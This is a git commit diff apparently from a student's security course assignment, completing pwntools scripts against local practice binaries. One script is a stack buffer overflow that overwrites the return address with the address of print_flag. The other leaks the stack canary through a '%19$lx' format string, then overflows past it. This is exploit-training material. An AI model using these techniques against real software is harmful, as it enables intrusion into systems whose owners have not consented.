7e4dc6ef5d2f3c86169f3dae268ba7f473559aee
riyagupta535 <164948364+riyagupta535@users.noreply.github.com>
2025-11-04 19:39:47 +0000

    part1, part2, part3

--- assignment-2/2-overflow-the-world/part2.py
+++ assignment-2/2-overflow-the-world/part2.py
@@ -8,10 +8,13 @@ r = process([exe.path])
 
 win = exe.symbols["print_flag"]
 #write your payload here, prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
-# payload = 
+payload = b'*' * 72
+payload += p64(win)
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
 
 r.recvuntil(b"Let's play a game.\n")
+_ = r.recvline()
+print(_.decode())
 r.interactive()
--- assignment-2/3-killing-the-canary/part3.py
+++ assignment-2/3-killing-the-canary/part3.py
@@ -8,18 +8,26 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"xxx") #Add your code here
+r.sendline(b"%19$lx") #Add your code here
 
-val = r.recvuntil(b"What's your message? ")
+_ = r.recvline()
+canary = _.decode().split(' ')[1].strip()
+canary = int(canary, 16)
+
+# val = r.recvuntil(b"What's your message? ")
 # log.info(val)
-canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
-log.info(f"Canary: {canary:x}")
+# canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
+# log.info(f"Canary: {canary:x}")
 
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = # Add your payload here
+payload = b"A" * 72
+payload += p64(canary)
+payload += b"B" * 8
+payload += p64(win)
+
 r.sendline(payload)
 
-r.recvline()
-r.interactive()
+r.recvall()
+print(_.decode())
